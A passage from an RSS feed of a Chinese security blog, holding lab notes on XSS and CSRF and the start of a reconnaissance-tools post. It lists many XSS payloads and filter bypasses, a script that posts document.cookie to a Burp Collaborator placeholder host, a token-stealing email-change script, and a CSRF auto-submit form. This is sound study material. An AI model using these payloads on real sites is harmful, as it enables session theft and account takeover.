&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;img src=&amp;quot;1&amp;quot; onerror=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一段 payload。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg onload=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网页的代码可能会从 url 中获取参数，url 中的参数不一定都是传给后端的，通过修改这些参数可能触发 XSS。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;javascript:alert (document.cookie)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;4.DOM 型的 XSS，目前来看是通过在 html 中添加 img 或者 svg 等元素，然后通过触发其中的 onerror 等属性来运行自己的 payload。&lt;br /&gt;
5. 为什么使用 HTML 编码能预防 XSS 攻击。&lt;br /&gt;
HTML 在解析时存在多种状态，在这个问题中需要了解 &amp;quot;Tag open state&amp;quot;, &amp;quot;Tag name state&amp;quot; 和 &amp;quot;Data state&amp;quot;,HTML 初始为 &amp;quot;Data state&amp;quot;, 在遇到第一个 &amp;lt; 后进入 &amp;quot;Tag open state&amp;quot;, 之后在遇到第一个字符时&lt;br /&gt;
进入 &amp;quot;Tag name state&amp;quot;，直到遇到 &amp;gt; 结束。当我们的 XSS 代码（比如 &amp;lt;script&amp;gt;alert ()&amp;lt;/script&amp;gt;）被 HTML 编码后，HTML 遇到被编码后的 &amp;lt;，不会进入 &amp;quot;Tag open state&amp;quot;，而是会保持 &amp;quot;Data state&amp;quot; 并对其解码，因此 &amp;lt; script &amp;gt; 标签不会发挥作用。&lt;br /&gt;
6. 使用以下代码绕过 html 编码保护， 仅在 DOM 中有用：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;onmouseover=&amp;quot;alert (1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
7. 一种新的 payload, 用于封闭 script 中变量的 &#39;&#39;。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;-alert (1)-&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
8. 有的变量里面也可以变成 payload，比如 a=b，但是如果只是修改 b 不能造成 xss，因为编译器只会将 payload 赋给 a，需要用一些符号让 payload 执行才行。之前的 sql 注入也有这种问题。&lt;br /&gt;
9.window.location 对象所包含的属性。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hash: 从井号开始的 URL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;host: 主机名和当前 URL 的端口号 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hostname: 当前 URL 的主机名 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;href: 完整的 URL&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pathname: 当前 URL 的路径部分 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;port: 当前 URL 的端口号 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;protocol: 当前 URL 的协议 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;search: 从问号开始的 URL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
10. 一种新的 payload。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$on.constructor (&amp;#x27;alert (1)&amp;#x27;)()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;11.AngularJS 是一个 js 框架，当有 ng-app 属性的 html 元素的内容被更改是，会执行 {分隔符 {分隔符} 分隔符} 的内容（分隔符当不存在，不加这个 hexo 报错）。&lt;br /&gt;
12.js 文件中存在变量赋值的地方需要注意，可以通过修改变量赋值，让其变成包含指令的运算，从而达到执行指令的目的。&lt;/p&gt;
&lt;ol start=&#34;13&#34;&gt;
&lt;li&gt;
&lt;p&gt;用于获取 cookie 的 payload&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fetch (&amp;#x27;https://BURP-COLLABORATOR-SUBDOMAIN&amp;#x27;, &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;method: &amp;#x27;POST&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mode: &amp;#x27;no-cors&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;body:document.cookie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用在 CSRF 中学到的基础绕过，依旧没有绕过 token，使用以下 XSS 的 payload 可以获取用户的 token。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var req = new XMLHttpRequest ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.onload = handleResponse;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.open (&amp;#x27;get&amp;#x27;,&amp;#x27;/my-account&amp;#x27;,true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.send ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function handleResponse () &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var token = this.responseText.match (/name=&amp;quot;csrf&amp;quot; value=&amp;quot;(\w+)&amp;quot;/)[1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var changeReq = new XMLHttpRequest ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    changeReq.open (&amp;#x27;post&amp;#x27;, &amp;#x27;/my-account/change-email&amp;#x27;, true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    changeReq.send (&amp;#x27;csrf=&amp;#x27;+token+&amp;#x27;&amp;amp;email=test@test.com&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过 burp intruder 配合 XSS cheat sheet 绕过 WAF，主要是通过字典找到 WAF 遗漏的标签和指令，从而根据这些漏洞实现攻击。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一种新的触发方法：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;xss id=x onfocus=alert (document.cookie) tabindex=1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
tabindex 将该标签设置为可以聚焦，之后可以在 URL 结尾处使用 #x 聚焦该标签，从而触发 onfocus 事件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一段 payload：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;animatetransform onbegin=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;rel=&amp;quot;canonical&amp;quot; 标签用于解决由于网址形式不同而内容相同造成的内容重复问题，各大搜索引擎只显示该标签后续跟的 href 指定的 url。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一种 payload。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;accesskey=&amp;#x27;x&amp;#x27;onclick=&amp;#x27;alert (1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
accesskey 属性用来指定使元素获得焦点的快捷键。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目前见过两种绕过 \ 的方法，一种是重复标签，一种是提前闭合。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTML 对标签标签和 &amp;amp; apos; 先处理，之后才会有 javascript 进行处理，可以利用这一特性实现绕过。&lt;br /&gt;
22.JavaScript template literal 的特征，如果 `` 之间包含 ${code}，就会执行 code。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;遇到 script 标签后，html 会停止解析并交给 javascript 解析，直到运行完毕。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 /**/ 来代替空格。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不带括弧调用函数。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;onerror=alert;throw 1337&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&amp;#123;onerror=alert&amp;#125;throw 1337&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;throw onerror=alert,&amp;#x27;some string&amp;#x27;,123,&amp;#x27;haha&amp;#x27;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&amp;#123;onerror=eval&amp;#125;throw&amp;#x27;=alert\x281337\x29&amp;#x27;&amp;lt;/script&amp;gt;   Chrome&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&amp;#123;onerror=eval&amp;#125;throw&amp;#123;lineNumber:1,columnNumber:1,fileName:1,message:&amp;#x27;alert\x281\x29&amp;#x27;&amp;#125;&amp;lt;/script&amp;gt;  Firefox &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&amp;#123;onerror=prompt&amp;#125;throw&amp;#123;lineNumber:1,columnNumber:1,fileName:&amp;#x27;second argument&amp;#x27;,message:&amp;#x27;first argument&amp;#x27;&amp;#125;&amp;lt;/script&amp;gt; Firefox&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;TypeError.prototype.name =&amp;#x27;=/&amp;#x27;,0 [onerror=eval][&amp;#x27;/-alert (1)//&amp;#x27;]&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a [12]+[1337]+a [13]&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;小结。&lt;br /&gt;
当 XSS 在 HTML 的 tag 之间时，尝试引入新的 tag。&lt;br /&gt;
当 XSS 在 HTML 的 tag 属性中时：1. 尝试闭合 tag 并引入新的 tag。2. 尝试闭合属性并引入新的属性。3. 检查该属性本身能否触发 XSS。&lt;br /&gt;
当 XSS 在 JavaScript 中时：尝试闭合当前 script 标签并引入新的 script。&lt;br /&gt;
当 XSS 在 JS 中的字符串中时：1. 尝试闭合两边的引号。如果 JS 对其中的符号进行了转义（\）, 可以尝试绕过 \。有时 XSS 能使用的字段也会被限制，可以尝试一些特殊的注入方式。&lt;br /&gt;
当 XSS 处于 JS 中，并且这个 JS 处于 HTML tag 中：可以尝试使用 HTML 编码绕过。&lt;br /&gt;
当 XSS 处于 JS 模板字符串中：有特殊的执行方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Dangling markup，一种逃脱标签并发起访问的方式。配合使用 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1dpbmRvdy5uYW1l&#34;&gt;Window.name&lt;/span&gt; 为表单和超链接提供目标，从而绕过 CSP。&lt;br /&gt;
28.&lt;br /&gt;
HTML 中的 input 如果有 name 属性，那就可以通过 get 传值，数据就会被提交到表单里，但是还不会发包。&lt;br /&gt;
29. 绕过 edge 的 csp&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://www.paypal.com/webapps/xoonboarding?values=etc&amp;amp;token=SOMETOKEN;_&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;csrf-跨站请求攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf-跨站请求攻击&#34;&gt;#&lt;/a&gt; CSRF (跨站请求攻击)&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;第一道题是使用的 burp 自带的 payload 生成工具，生成的 payload 如下。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;script&amp;gt;history.pushState (&amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;, &amp;#x27;/&amp;#x27;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;form action=&amp;quot;URL&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;email&amp;quot; value=&amp;quot;EMAIL_ADDRESS&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit request&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      document.forms [0].submit ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;有的网页会检查 token，但更换下请求方式可能能绕过。&lt;/li&gt;
&lt;li&gt;更改要检查的 token 名可能也能绕过。&lt;/li&gt;
&lt;li&gt;可以考虑有的网站生成 token 后，没有和当前用户 session 绑定，因此如果当前 token 没有用于验证，可能会在后台持续存在。因此可以截获一段 request 并复制其 token，之后 drop 掉该 request，此时这段 token 便可用于 CSRF 包的构筑 ，因为没有与我的 session，victim 便可以用这个 token 修改他自己的包。&lt;/li&gt;
&lt;li&gt;如果 token 与用户的 cookie 绑定，而用的 request 修改 session 后可能会导致用户退出，但修改 cookie 不会，则 cookie 可能并未与 session 绑定，因此可以尝试用 xss 漏洞配合 set-cookie 修改用户的 cookie，使其与自己的 payload 中的 token 一致。&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/11/15/information-collection/</guid>
            <title>information-collection</title>
            <link>http://ericcd.com/2022/11/15/information-collection/</link>
            <category term="web" scheme="http://ericcd.com/categories/web/" />
            <category term="web" scheme="http://ericcd.com/tags/web/" />
            <pubDate>Tue, 15 Nov 2022 21:57:34 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一些信息搜集工具。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;子域名收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#子域名收集&#34;&gt;#&lt;/a&gt; 子域名收集&lt;/h1&gt;
&lt;p&gt;1.Knockpy&lt;br /&gt;
2.Sublist3r&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Fib3VsM2xhL1N1Ymxpc3Qzcg==&#34;&gt;https://github.com/aboul3la/Sublist3r&lt;/span&gt;&lt;br /&gt;
3.Google dorks&lt;br /&gt;
4.GoogDrker&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1plcGhyRmlzaC9Hb29nRDBya2Vy&#34;&gt;https://github.com/ZephrFish/GoogD0rker&lt;/span&gt;&lt;br /&gt;
5.Amass&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL09XQVNQL0FtYXNz&#34;&gt;https://github.com/OWASP/Amass&lt;/span&gt;&lt;br /&gt;
6.curl&lt;br /&gt;
7. 自定义脚本&lt;/p&gt;
&lt;p&gt;#Web 指纹&lt;br /&gt;
 1.curl&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  curl -i -X OPTIONS url&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
2.NMAP&lt;br /&gt;
